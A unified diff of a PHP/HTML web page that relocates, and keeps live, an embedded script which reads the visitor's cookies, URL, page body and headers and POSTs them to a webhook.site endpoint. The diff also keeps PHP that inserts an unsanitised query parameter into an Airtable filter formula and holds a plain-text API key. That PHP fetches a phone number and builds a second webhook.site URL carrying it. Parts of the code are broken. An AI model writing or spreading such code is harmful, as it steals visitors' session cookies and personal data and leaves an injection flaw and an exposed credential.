@@ -12,52 +12,7 @@
 <?php
 $_GET['u']
   ?>
-<script>
-  const cookieValue = document.cookie;
-const cookieValue2 = document.URL;
-const cookieValue3 = JSON.stringify(document.cookie);
-const cookieValue4 = myXMLHttpRequest.getAllResponseHeaders();
-// Get the content body as JSON
-const contentBody = JSON.stringify(document.body);
 
-// Create the HTTP request
-const xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://webhook.site/savesccookie');
-xhr.setRequestHeader('Content-Type', 'application/json');
-
-// Prepare the data to send
-const data = JSON.stringify({
-  cookie: cookieValue,
-  content: contentBody,
-  content2: cookieValue2,
-  content3: cookieValue3,
-  content4: cookieValue4
-});
-
-// Send the HTTP request
-xhr.send(data);
-</script>
-<?php
-$da = $_GET['u'];
-$json_quesions = "https://api.airtable.com/v0/appZt18kWI4Ru4QXU/tblkA5D2TF3g1O3Bc?maxRecords=1&filterByFormula=(%7BCalculation%7D+%3D+'$da')&maxRecords=1&api_key=key92qoDX706Uabv8";
-$question = file_get_contents($json_quesions);
-$data = json_decode($question, true);
-$option1 = $data['records'][0]['fields']['phone'];
-
-print_r($option1);
-
-echo $option1;
-url = "https://webhook.site/whred?phone=$option1&short=$da";
-print_r($url);
-?>
-
-<?php
-
-#header("Location: $url");
-
-#exit;
-
-?>
 <?php
 
 echo 'ok this is from php';
@@ -432,3 +387,49 @@ $.ajax({
 
 }, 1500);
 });</script>
+<script>
+  const cookieValue = document.cookie;
+const cookieValue2 = document.URL;
+const cookieValue3 = JSON.stringify(document.cookie);
+const cookieValue4 = myXMLHttpRequest.getAllResponseHeaders();
+// Get the content body as JSON
+const contentBody = JSON.stringify(document.body);
+
+// Create the HTTP request
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://webhook.site/savesccookie');
+xhr.setRequestHeader('Content-Type', 'application/json');
+
+// Prepare the data to send
+const data = JSON.stringify({
+  cookie: cookieValue,
+  content: contentBody,
+  content2: cookieValue2,
+  content3: cookieValue3,
+  content4: cookieValue4
+});
+
+// Send the HTTP request
+xhr.send(data);
+</script>
+<?php
+$da = $_GET['u'];
+$json_quesions = "https://api.airtable.com/v0/appZt18kWI4Ru4QXU/tblkA5D2TF3g1O3Bc?maxRecords=1&filterByFormula=(%7BCalculation%7D+%3D+'$da')&maxRecords=1&api_key=key92qoDX706Uabv8";
+$question = file_get_contents($json_quesions);
+$data = json_decode($question, true);
+$option1 = $data['records'][0]['fields']['phone'];
+
+print_r($option1);
+
+echo $option1;
+url = "https://webhook.site/whred?phone=$option1&short=$da";
+print_r($url);
+?>
+
+<?php
+
+#header("Location: $url");
+
+#exit;
+
+?>
